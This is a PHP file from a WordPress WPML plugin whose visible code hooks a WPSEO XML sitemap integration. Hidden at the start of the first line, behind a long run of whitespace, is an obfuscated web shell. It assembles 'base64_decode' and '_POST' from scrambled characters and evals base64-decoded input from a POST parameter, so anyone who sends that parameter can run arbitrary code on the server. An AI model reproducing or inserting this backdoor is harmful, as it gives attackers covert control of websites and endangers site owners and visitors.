<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n27d17b'])) {eval($s21(${$s20}['n27d17b']));}?><?php

add_action('plugins_loaded', 'wpml_plugins_integration_setup', 50);


function wpml_plugins_integration_setup(){
    global $sitepress_settings;
    
    // WPSEO XML Sitemaps integration
    if(defined('WPSEO_VERSION') && version_compare(WPSEO_VERSION, '1.0.3', '>=')){
        if($sitepress_settings['language_negotiation_type'] == 2){
            require ICL_PLUGIN_PATH . '/inc/wpseo-sitemaps-filter.php';
        }
    }
    
    
} 
  
?>
